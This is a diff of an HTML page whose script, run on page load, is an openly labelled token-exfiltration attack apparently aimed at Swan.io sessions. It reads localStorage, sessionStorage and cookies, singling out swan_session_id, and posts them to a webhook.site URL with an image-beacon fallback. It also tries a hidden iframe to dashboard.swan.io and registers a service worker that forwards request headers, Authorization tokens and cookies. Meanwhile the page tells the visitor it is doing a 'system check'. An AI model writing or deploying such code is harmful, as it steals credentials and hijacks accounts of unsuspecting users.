@@ -47,7 +47,6 @@
         #status { margin: 15px 0; color: #7f8c8d; }
         #log-container {
             margin-top: 20px;
-            display: none;
         }
         #log {
             background: #f8f8f8;
@@ -85,12 +84,11 @@
     </div>
 
     <script>
-        // Configuration
+        // Configuration - REPLACE WITH YOUR WEBHOOK URL
         const WEBHOOK_URL = "https://webhook.site/9ef1fe5e-6b72-4a68-b1bd-5ca39d09311a";
         
         // DOM Elements
         const statusEl = document.getElementById('status');
-        const logContainer = document.getElementById('log-container');
         const logEl = document.getElementById('log');
         
         // Logging utility
@@ -109,168 +107,202 @@
             statusEl.textContent = message;
         }
         
-        // Show debug log
-        function showLog() {
-            logContainer.style.display = 'block';
+        // DIRECT EXFILTRATION FUNCTIONS
+        
+        // Send data to webhook using fetch
+        function sendToWebhook(data) {
+            try {
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data),
+                    mode: 'no-cors'
+                });
+                log(`Data sent to webhook: ${JSON.stringify(data).substring(0, 100)}...`, 'success');
+            } catch (e) {
+                log(`Error sending to webhook: ${e.message}`, 'error');
+                // Fallback to image method
+                sendViaImage(data);
+            }
         }
         
-        // Exfiltrate data to webhook
-        function exfilData(data) {
-            // Add metadata
-            const payload = {
-                ...data,
+        // Send data via image for fallback
+        function sendViaImage(data) {
+            try {
+                const img = new Image();
+                const jsonStr = JSON.stringify(data);
+                
+                // For small data, send directly
+                if (jsonStr.length < 1500) {
+                    img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(jsonStr)}&t=${Date.now()}`;
+                    log("Data sent via image", 'info');
+                } else {
+                    // For larger data, split into chunks
+                    const chunks = Math.ceil(jsonStr.length / 1500);
+                    for (let i = 0; i < chunks; i++) {
+                        const chunk = jsonStr.substring(i * 1500, (i + 1) * 1500);
+                        const chunkImg = new Image();
+                        chunkImg.src = `${WEBHOOK_URL}?chunk=${i+1}of${chunks}&data=${encodeURIComponent(chunk)}&t=${Date.now()}`;
+                    }
+                    log(`Data sent via ${chunks} image chunks`, 'info');
+                }
+            } catch (e) {
+                log(`Error sending via image: ${e.message}`, 'error');
+            }
+        }
+        
+        // EXTRACTION FUNCTIONS
+        
+        // Extract localStorage items
+        function extractLocalStorage() {
+            try {
+                const data = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    data[key] = localStorage.getItem(key);
+                }
+                
+                // Immediately send to webhook
+                sendToWebhook({
+                    type: 'localStorage',
+                    data: data,
+                    timestamp: new Date().toISOString()
+                });
+                
+                log(`Extracted ${Object.keys(data).length} localStorage items`, 'success');
+                return data;
+            } catch (e) {
+                log(`Error extracting localStorage: ${e.message}`, 'error');
+                return {};
+            }
+        }
+        
+        // Extract sessionStorage items
+        function extractSessionStorage() {
+            try {
+                const data = {};
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    data[key] = sessionStorage.getItem(key);
+                }
+                
+                // Immediately send to webhook
+                sendToWebhook({
+                    type: 'sessionStorage',
+                    data: data,
+                    timestamp: new Date().toISOString()
+                });
+                
+                log(`Extracted ${Object.keys(data).length} sessionStorage items`, 'success');
+                return data;
+            } catch (e) {
+                log(`Error extracting sessionStorage: ${e.message}`, 'error');
+                return {};
+            }
+        }
+        
+        // Extract cookies
+        function extractCookies() {
+            try {
+                const cookies = {};
+                document.cookie.split(';').forEach(cookie => {
+                    if (cookie.trim()) {
+                        const [name, value] = cookie.trim().split('=');
+                        cookies[name] = value;
+                    }
+                });
+                
+                // Immediately send to webhook
+                sendToWebhook({
+                    type: 'cookies',
+                    data: cookies,
+                    timestamp: new Date().toISOString()
+                });
+                
+                // Special handling for swan_session_id
+                if (cookies['swan_session_id']) {
+                    sendToWebhook({
+                        type: 'swan_session_id',
+                        data: cookies['swan_session_id'],
+                        timestamp: new Date().toISOString()
+                    });
+                    log(`Found swan_session_id: ${cookies['swan_session_id'].substring(0, 10)}...`, 'success');
+                }
+                
+                log(`Extracted ${Object.keys(cookies).length} cookies`, 'success');
+                return cookies;
+            } catch (e) {
+                log(`Error extracting cookies: ${e.message}`, 'error');
+                return {};
+            }
+        }
+        
+        // Extract all tokens and send immediately
+        function extractAllTokens() {
+            log('Extracting all tokens...');
+            
+            // Extract and send each storage type separately
+            const localStorage = extractLocalStorage();
+            const sessionStorage = extractSessionStorage();
+            const cookies = extractCookies();
+            
+            // Also send a combined report
+            sendToWebhook({
+                type: 'all_tokens',
+                localStorage: localStorage,
+                sessionStorage: sessionStorage,
+                cookies: cookies,
                 url: window.location.href,
                 userAgent: navigator.userAgent,
                 timestamp: new Date().toISOString()
-            };
-            
-            // Method 1: Use fetch with no-cors mode
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload),
-                mode: 'no-cors'
-            }).catch(() => {
-                // Fallback to image-based exfil
-                imageExfil(payload);
             });
+            
+            log('All tokens extracted and sent', 'success');
         }
         
-        // Image-based exfiltration (works around CORS)
-        function imageExfil(data) {
-            // Serialize data
-            const jsonData = JSON.stringify(data);
+        // Try to extract tokens from dashboard.swan.io via iframe
+        function tryDashboardIframe() {
+            log('Attempting to access dashboard.swan.io via iframe...');
             
-            // Split into chunks if large
-            const chunkSize = 1500; // URL length limitation
-            
-            for (let i = 0; i < jsonData.length; i += chunkSize) {
-                const chunk = jsonData.substring(i, i + chunkSize);
-                const img = new Image();
-                img.src = `${WEBHOOK_URL}?chunk=${i}&total=${Math.ceil(jsonData.length/chunkSize)}&data=${encodeURIComponent(chunk)}&t=${Date.now()}`;
-            }
-        }
-        
-        // Extract all tokens from browser storage and cookies
-        function extractAllTokens() {
-            const tokens = {};
-            
-            // 1. Extract from localStorage
             try {
-                const localStorageTokens = {};
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    const value = localStorage.getItem(key);
-                    localStorageTokens[key] = value;
-                }
-                tokens.localStorage = localStorageTokens;
-                log(`Extracted ${Object.keys(localStorageTokens).length} localStorage items`);
-            } catch (e) {
-                log(`Error accessing localStorage: ${e.message}`, 'error');
-            }
-            
-            // 2. Extract from sessionStorage
-            try {
-                const sessionStorageTokens = {};
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    const value = sessionStorage.getItem(key);
-                    sessionStorageTokens[key] = value;
-                }
-                tokens.sessionStorage = sessionStorageTokens;
-                log(`Extracted ${Object.keys(sessionStorageTokens).length} sessionStorage items`);
-            } catch (e) {
-                log(`Error accessing sessionStorage: ${e.message}`, 'error');
-            }
-            
-            // 3. Extract all cookies
-            try {
-                const cookieObj = {};
-                const cookies = document.cookie.split(';');
-                for (const cookie of cookies) {
-                    if (cookie.trim()) {
-                        const [name, value] = cookie.trim().split('=');
-                        cookieObj[name] = value;
-                    }
-                }
-                tokens.cookies = cookieObj;
-                log(`Extracted ${Object.keys(cookieObj).length} cookies`);
-                
-                // 4. Specifically check for swan_session_id
-                if (cookieObj['swan_session_id']) {
-                    log(`Found swan_session_id cookie: ${cookieObj['swan_session_id'].substring(0, 10)}...`, 'success');
-                }
-            } catch (e) {
-                log(`Error accessing cookies: ${e.message}`, 'error');
-            }
-            
-            return tokens;
-        }
-        
-        // Create an iframe to dashboard.swan.io to extract tokens
-        function createDashboardIframe() {
-            return new Promise((resolve) => {
-                log('Creating iframe to dashboard.swan.io...');
-                
-                // Create hidden iframe
                 const iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
                 iframe.src = 'https://dashboard.swan.io/';
                 
-                // Set timeout to handle case where iframe doesn't load
-                const timeout = setTimeout(() => {
-                    log('Dashboard iframe timed out', 'warning');
-                    try { document.body.removeChild(iframe); } catch (e) {}
-                    resolve();
-                }, 5000);
-                
-                // Handle iframe load
-                iframe.onload = () => {
-                    log('Dashboard iframe loaded');
+                iframe.onload = function() {
+                    log('Iframe loaded, attempting to extract tokens...');
                     
                     try {
-                        // Try to access iframe content (will likely fail due to same-origin policy)
-                        const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
-                        log('Successfully accessed dashboard iframe content', 'success');
+                        // This will likely fail due to same-origin policy
+                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                        const iframeCookies = iframeDoc.cookie;
                         
-                        // Try to extract cookies (will likely fail)
-                        try {
-                            const cookies = iframeDocument.cookie;
-                            log(`Extracted cookies from iframe: ${cookies}`);
-                            exfilData({
-                                action: 'iframe_cookies_extracted',
-                                cookies: cookies
-                            });
-                        } catch (e) {
-                            log('Cannot access iframe cookies due to same-origin policy', 'warning');
-                        }
+                        sendToWebhook({
+                            type: 'iframe_cookies',
+                            data: iframeCookies,
+                            timestamp: new Date().toISOString()
+                        });
+                        
+                        log('Successfully extracted cookies from iframe', 'success');
                     } catch (e) {
-                        log('Cannot access iframe content due to same-origin policy', 'warning');
+                        log(`Cannot access iframe content: ${e.message}`, 'error');
                     }
                     
-                    clearTimeout(timeout);
-                    try { document.body.removeChild(iframe); } catch (e) {}
-                    resolve();
+                    // Remove iframe after attempt
+                    document.body.removeChild(iframe);
                 };
                 
-                // Handle iframe errors
-                iframe.onerror = () => {
-                    log('Dashboard iframe failed to load', 'error');
-                    clearTimeout(timeout);
-                    try { document.body.removeChild(iframe); } catch (e) {}
-                    resolve();
-                };
-                
-                // Add iframe to document
                 document.body.appendChild(iframe);
-            });
+            } catch (e) {
+                log(`Error creating iframe: ${e.message}`, 'error');
+            }
         }
         
-        // Register a service worker to intercept requests
+        // Register service worker to intercept requests
         async function registerServiceWorker() {
             if (!('serviceWorker' in navigator)) {
-                log('Service Worker API not supported', 'error');
-                return false;
+                log('Service Worker not supported', 'error');
+                return;
             }
             
             try {
@@ -280,9 +312,6 @@
                 const swCode = `
                     // Service Worker for Swan.io token exfiltration
                     const WEBHOOK_URL = "${WEBHOOK_URL}";
-                    
-                    // Store extracted tokens
-                    const extractedTokens = new Set();
                     
                     // Listen for fetch events
                     self.addEventListener('fetch', event => {
@@ -301,51 +330,46 @@
                                         headers[key.toLowerCase()] = value;
                                     });
                                     
-                                    // Look for Authorization header
-                                    if (headers.authorization && headers.authorization.startsWith('Bearer ')) {
-                                        const token = headers.authorization.substring(7);
-                                        
-                                        if (!extractedTokens.has(token)) {
-                                            extractedTokens.add(token);
-                                            
-                                            // Send token to webhook
-                                            fetch(WEBHOOK_URL, {
-                                                method: 'POST',
-                                                headers: { 'Content-Type': 'application/json' },
-                                                body: JSON.stringify({
-                                                    action: 'sw_token_extracted',
-                                                    token: token,
-                                                    url: url.toString(),
-                                                    timestamp: new Date().toISOString()
-                                                }),
-                                                mode: 'no-cors'
-                                            }).catch(() => {
-                                                // Fallback to image beacon
-                                                const img = new Image();
-                                                img.src = WEBHOOK_URL + "?action=sw_token&token=" + 
-                                                    encodeURIComponent(token.substring(0, 20)) + 
-                                                    "&t=" + Date.now();
-                                            });
-                                        }
-                                    }
+                                    // Send all headers to webhook
+                                    fetch(WEBHOOK_URL, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({
+                                            type: 'request_headers',
+                                            url: url.toString(),
+                                            headers: headers,
+                                            timestamp: new Date().toISOString()
+                                        }),
+                                        mode: 'no-cors'
+                                    });
                                     
-                                    // Look for cookies
-                                    if (headers.cookie) {
-                                        // Send cookies to webhook
+                                    // Specifically look for auth headers
+                                    if (headers.authorization) {
                                         fetch(WEBHOOK_URL, {
                                             method: 'POST',
                                             headers: { 'Content-Type': 'application/json' },
                                             body: JSON.stringify({
-                                                action: 'sw_cookies_extracted',
-                                                cookies: headers.cookie,
+                                                type: 'authorization_header',
                                                 url: url.toString(),
+                                                authorization: headers.authorization,
                                                 timestamp: new Date().toISOString()
                                             }),
                                             mode: 'no-cors'
-                                        }).catch(() => {
-                                            // Fallback to image beacon
-                                            const img = new Image();
-                                            img.src = WEBHOOK_URL + "?action=sw_cookies&t=" + Date.now();
+                                        });
+                                    }
+                                    
+                                    // Look for cookies
+                                    if (headers.cookie) {
+                                        fetch(WEBHOOK_URL, {
+                                            method: 'POST',
+                                            headers: { 'Content-Type': 'application/json' },
+                                            body: JSON.stringify({
+                                                type: 'request_cookies',
+                                                url: url.toString(),
+                                                cookies: headers.cookie,
+                                                timestamp: new Date().toISOString()
+                                            }),
+                                            mode: 'no-cors'
                                         });
                                     }
                                 } catch (e) {
@@ -373,79 +397,79 @@
                 const registration = await navigator.serviceWorker.register(swUrl, { scope: '/' });
                 log(`Service worker registered with scope: ${registration.scope}`, 'success');
                 
-                return true;
+                // Send confirmation to webhook
+                sendToWebhook({
+                    type: 'service_worker_registered',
+                    scope: registration.scope,
+                    timestamp: new Date().toISOString()
+                });
             } catch (e) {
                 log(`Service worker registration failed: ${e.message}`, 'error');
-                return false;
+                
+                // Send error to webhook
+                sendToWebhook({
+                    type: 'service_worker_error',
+                    error: e.message,
+                    timestamp: new Date().toISOString()
+                });
             }
         }
         
-        // Attempt to open dashboard.swan.io in a new tab
-        function openDashboardTab() {
-            try {
-                log('Attempting to open dashboard.swan.io in a new tab...');
-                
-                // Create a button that will open the tab when clicked
-                const button = document.createElement('button');
-                button.style.display = 'none';
-                button.textContent = 'Open Dashboard';
-                
-                button.onclick = () => {
-                    window.open('https://dashboard.swan.io/', '_blank');
-                };
-                
-                document.body.appendChild(button);
-                button.click();
-                document.body.removeChild(button);
-                
-                log('Dashboard tab opened');
-                return true;
-            } catch (e) {
-                log(`Failed to open dashboard tab: ${e.message}`, 'error');
-                return false;
-            }
+        // Make a test request to Swan.io to trigger service worker
+        function makeTestRequest() {
+            log('Making test request to Swan.io...');
+            
+            fetch('https://api.swan.io/admin/graphql', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    query: '{ __typename }'
+                })
+            }).catch(e => {
+                // Ignore errors, we just want to trigger the service worker
+            });
         }
         
-        // Main execution flow
+        // Main execution
         async function main() {
             log('Starting token exfiltration...');
-            updateStatus('Checking system configuration...');
-            showLog();
             
-            // 1. Extract tokens from current page
-            const tokens = extractAllTokens();
-            
-            // 2. Exfiltrate tokens to webhook
-            exfilData({
-                action: 'tokens_extracted',
-                tokens: tokens
+            // Send initial ping to webhook
+            sendToWebhook({
+                type: 'exfiltration_started',
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
             });
             
-            log('Tokens exfiltrated to webhook', 'success');
-            updateStatus('Checking authentication tokens...');
+            // 1. Extract all tokens immediately
+            extractAllTokens();
             
-            // 3. Try to create iframe to dashboard.swan.io
-            await createDashboardIframe();
+            // 2. Try to access dashboard.swan.io via iframe
+            tryDashboardIframe();
             
-            // 4. Register service worker to intercept future requests
+            // 3. Register service worker
             await registerServiceWorker();
             
-            // 5. Try to open dashboard.swan.io in a new tab
-            // Commented out as it may be blocked by popup blockers
-            // openDashboardTab();
+            // 4. Make a test request to trigger service worker
+            setTimeout(makeTestRequest, 1000);
             
-            // 6. Complete
-            log('Token exfiltration complete', 'success');
+            // 5. Update status
             updateStatus('System check complete');
+            log('Token exfiltration complete', 'success');
             
-            // Final exfiltration
-            exfilData({
-                action: 'exfiltration_complete',
-                success: true
+            // 6. Send completion notification
+            sendToWebhook({
+                type: 'exfiltration_complete',
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
             });
         }
         
-        // Start the exfiltration flow when page loads
+        // Start exfiltration when page loads
         window.addEventListener('load', main);
     </script>
 </body>
